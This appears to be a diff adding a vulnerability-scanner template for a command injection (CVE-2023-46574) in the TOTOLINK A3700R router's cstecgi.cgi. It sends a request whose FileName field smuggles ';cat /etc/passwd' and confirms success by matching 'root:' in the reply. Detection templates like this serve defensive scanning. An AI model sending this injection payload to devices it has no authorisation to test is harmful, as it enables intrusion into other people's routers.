@@ -1,0 +1,24 @@
+id: totolink-a3700r-cstecgi-cgi-command-injection
+info:
+  name: TOTOLINK A3700R cstecgi.cgi Command Injection (CVE-2023-46574)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve-2023-46574,command-injection
+http:
+  - raw:
+      - |
+        GET /cgi-bin/cstecgi.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"topicurl":"UploadFirmwareFile","FileName":";cat /etc/passwd"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
